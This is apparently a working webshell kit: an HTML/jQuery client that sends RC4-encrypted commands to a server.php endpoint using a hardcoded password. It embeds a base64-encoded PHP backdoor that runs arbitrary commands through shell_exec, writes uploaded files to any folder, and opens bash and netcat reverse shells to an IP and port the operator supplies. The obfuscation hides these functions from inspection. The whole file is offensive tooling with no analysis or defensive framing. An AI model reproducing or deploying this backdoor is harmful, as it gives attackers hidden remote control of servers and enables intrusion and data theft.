<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Webshell</title>
	<link rel="stylesheet" href="">
	<!-- javascript -->
	<script src="jquery.min.js"></script>

</head>
<body>
	<input type="text" id="url" value="http://localhost/post_exploitation/server.php" placeholder="http://">
	<input type="text" id="cmd" placeholder="Command line ...">
	<input type="submit" id="sendCommand" value="Execute">
	<input type="password" id="password" value="cns3c_p4swd" placeholder="password for encrypt"><br>
	<textarea id="output" id="" cols="30" rows="10" style="margin: 0px; width: 1345px; height: 549px;"></textarea>
	<input type="file" id="data_upload">
	<input type="submit" id="submit_file">

	<!-- javascript submit-->
	<script>
		$("#cmd").keydown(function(e){
			if (e.keyCode == 13){
				$("#sendCommand")[0].click();
			}
		})
		$("#sendCommand").click(function(){
			cmd = encrypt($('#cmd')[0].value, $('#cmd')[0].value);

			$.post({
				url: $('#url')[0].value,
				headers:{
					"code": $shell_content
				},
				data: {
					'password'	: cmd,
				},
				success: function(data){
					$('#output').html($('#output').html() + decrypt(data));
				}
			});
		});
	</script>

	<!-- Algorithm RC4 -->
	<script>
		function rc4(key, str) {
			var s = [], j = 0, x, res = '';
			for (var i = 0; i < 256; i++) {
				s[i] = i;
			}
			for (i = 0; i < 256; i++) {
				j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
			}
			i = 0;
			j = 0;
			for (var y = 0; y < str.length; y++) {
				i = (i + 1) % 256;
				j = (j + s[i]) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
				res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
			}
			return res;
		}

		function encrypt(text){
			key = $('#password')[0].value;
			return btoa(rc4(key, text));
		}

		function decrypt(text){
			key = $('#password')[0].value;
			return rc4(key, atob(text));
		}
	</script>
	
	<!-- webshell content-->
	<script>

		$shell_content = "JEtFWSA9ICJjbnMzY19wNHN3ZCI7CgovLyBBbGdvcml0aG0gUkM0CmZ1bmN0aW9uIHJjNCgka2V5LCAkc3RyKSB7CiRzID0gYXJyYXkoKTsKZm9yICgkaSA9IDA7ICRpIDwgMjU2OyAkaSsrKSB7CiRzWyRpXSA9ICRpOwp9CiRqID0gMDsKZm9yICgkaSA9IDA7ICRpIDwgMjU2OyAkaSsrKSB7CiRqID0gKCRqICsgJHNbJGldICsgb3JkKCRrZXlbJGkgJSBzdHJsZW4oJGtleSldKSkgJSAyNTY7CiR4ID0gJHNbJGldOwokc1skaV0gPSAkc1skal07CiRzWyRqXSA9ICR4Owp9CiRpID0gMDsKJGogPSAwOwokcmVzID0gJyc7CmZvciAoJHkgPSAwOyAkeSA8IHN0cmxlbigkc3RyKTsgJHkrKykgewokaSA9ICgkaSArIDEpICUgMjU2OwokaiA9ICgkaiArICRzWyRpXSkgJSAyNTY7CiR4ID0gJHNbJGldOwokc1skaV0gPSAkc1skal07CiRzWyRqXSA9ICR4OwokcmVzIC49ICRzdHJbJHldIF4gY2hyKCRzWygkc1skaV0gKyAkc1skal0pICUgMjU2XSk7Cn0KcmV0dXJuICRyZXM7Cn0KCmZ1bmN0aW9uIGVuY3J5cHQoJHRleHQpewpnbG9iYWwgJEtFWTsKcmV0dXJuIGJhc2U2NF9lbmNvZGUocmM0KCRLRVksICR0ZXh0KSk7Cn0KCmZ1bmN0aW9uIGRlY3J5cHQoJGNpcGhlcil7Cmdsb2JhbCAkS0VZOwpyZXR1cm4gcmM0KCRLRVksIGJhc2U2NF9kZWNvZGUoJGNpcGhlcikpOwp9CgovLyBFeGVjdXRlIGNvbW1hbmQKaWYgKGlzc2V0KCRfUE9TVFsncGFzc3dvcmQnXSkgJiYgIWVtcHR5KCRfUE9TVFsncGFzc3dvcmQnXSkpewokY21kID0gZGVjcnlwdCgkX1BPU1RbJ3Bhc3N3b3JkJ10pOwokb3V0cHV0ID0gc2hlbGxfZXhlYygkY21kKTsKZWNobyBlbmNyeXB0KCRvdXRwdXQpOwpyZXR1cm47Cn0KCi8vIFVwbG9hZCBmaWxlCmlmIChpc3NldCgkX1BPU1RbJ2YnXSkgJiYgIWVtcHR5KCRfUE9TVFsnZiddKSAmJiAKaXNzZXQoJF9GSUxFU1snZGF0YV91cGxvYWQnXSkgJiYgJF9GSUxFU1snZGF0YV91cGxvYWQnXVsnc2l6ZSddID4gMCl7CgovLyBEZWNvZGUgaW5wdXQKJGZpbGVuYW1lICA9ICBkZWNyeXB0KCRfRklMRVNbJ2RhdGFfdXBsb2FkJ11bJ25hbWUnXSk7CiRmb2xkZXIgID0gIGRlY3J5cHQoJF9QT1NUWydmJ10pOwokZGF0YSAgPSAgZGVjcnlwdChmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydkYXRhX3VwbG9hZCddWyd0bXBfbmFtZSddKSk7CgovLyBDb25kaXRpb24KaWYgKGZpbGVfZXhpc3RzKCRmb2xkZXIgLiAkZmlsZW5hbWUpKXsKZWNobyBlbmNyeXB0KCJGaWxlIGV4aXN0cy4iKTsKcmV0dXJuOwp9CmlmIChzdHJsZW4oJGRhdGEpID09IDApewplY2hvIGVuY3J5cHQoIkRlY3J5cHRpb24gZGF0YSBoYXMgYmVlbiBmYWlsLiIpOwpyZXR1cm47Cn0KCi8vIEhhbmRsZQpmaWxlX3B1dF9jb250ZW50cygkZm9sZGVyIC4gJGZpbGVuYW1lLCAkZGF0YSk7Ci8vIENhbiBraWVtIHRyYSBzdSB0aGFuaCBjb25nIGN1YSB1cGxvYWQKCi8vIEVuY29kZSBvdXRwdXQKZWNobyBlbmNyeXB0KCRmaWxlbmFtZSAuICIgaGFzIGJlZW4gdXBvYWRlZC4iKTsKcmV0dXJuOwp9CgovLyBSZXZlcnNlIHNoZWxsIHVzaW5nIGJhc2gKaWYgKGlzc2V0KCRfUE9TVFsnaXAnXSkgICYmICFlbXB0eSgkX1BPU1RbJ2lwJ10pICAmJgppc3NldCgkX1BPU1RbJ3BvcnQnXSkgICYmICFlbXB0eSgkX1BPU1RbJ3BvcnQnXSkgICYmCmlzc2V0KCRfUE9TVFsncmVfYmFzaCddKSkgewoKLy8gRGVjb2RlIGlucHV0CiRpcCA9IGRlY3J5cHQoJF9QT1NUWydpcCddKTsKJHBvcnQgPSBkZWNyeXB0KCRfUE9TVFsncG9ydCddKTsKCi8vIEhhbmRsZQokcmV2ZXJzZV9zdHIgPSAiL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL3skaXB9L3skcG9ydH0gMD4mMSI7CmVjaG8gJHJldmVyc2Vfc3RyOwovLyBzaGVsbF9leGVjKCRyZXZlcnNlX3N0cik7CnJldHVybjsKfQoKLy8gUmV2ZXJzZSBzaGVsbCB1c2luZyBuZXRjYXQKaWYgKGlzc2V0KCRfUE9TVFsnaXAnXSkgICYmICFlbXB0eSgkX1BPU1RbJ2lwJ10pICAmJgppc3NldCgkX1BPU1RbJ3BvcnQnXSkgICYmICFlbXB0eSgkX1BPU1RbJ3BvcnQnXSkgICYmCmlzc2V0KCRfUE9TVFsncmVfbmV0Y2F0J10pKSB7CgovLyBEZWNvZGUgaW5wdXQKJGlwID0gZGVjcnlwdCgkX1BPU1RbJ2lwJ10pOwokcG9ydCA9IGRlY3J5cHQoJF9QT1NUWydwb3J0J10pOwoKLy8gSGFuZGxlCiRyZXZlcnNlX3N0ciA9ICJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyB7JGlwfSB7JHBvcnR9ID4vdG1wL2YiOwplY2hvICRyZXZlcnNlX3N0cjsKc2hlbGxfZXhlYygkcmV2ZXJzZV9zdHIpOwpyZXR1cm47Cn0=";
	</script>
	
</body>
</html>


 ?>
